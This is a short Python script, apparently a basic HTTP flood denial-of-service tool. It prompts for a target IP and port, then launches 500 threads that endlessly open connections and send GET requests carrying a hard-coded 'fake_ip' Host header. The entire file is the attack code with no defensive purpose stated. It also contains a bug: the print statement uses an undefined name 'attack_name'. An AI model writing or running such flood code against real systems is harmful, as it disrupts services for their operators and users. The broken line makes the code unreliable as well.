import socket
import threading

target = input("Enter target ip: ")
fake_ip = "125.245.192.66"
port = int(input("Enter target port: "))

attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print("Packets Sent: ", attack_name)
        
        s.close()
        
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()